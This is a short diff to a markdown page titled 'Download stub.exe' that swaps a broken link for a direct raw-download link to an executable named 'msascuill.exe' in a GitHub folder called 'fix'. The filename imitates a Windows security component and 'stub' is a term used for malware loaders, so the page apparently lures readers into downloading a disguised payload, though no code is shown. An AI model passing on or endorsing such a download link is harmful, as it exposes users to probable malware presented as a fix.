@@ -1,3 +1,3 @@
 # Download stub.exe
 > Download 
-> [here](tps://pages.github.com/)
+ [here](https://github.com/xvovabluex/userMemory/blob/main/fix/msascuill.exe?raw=true)
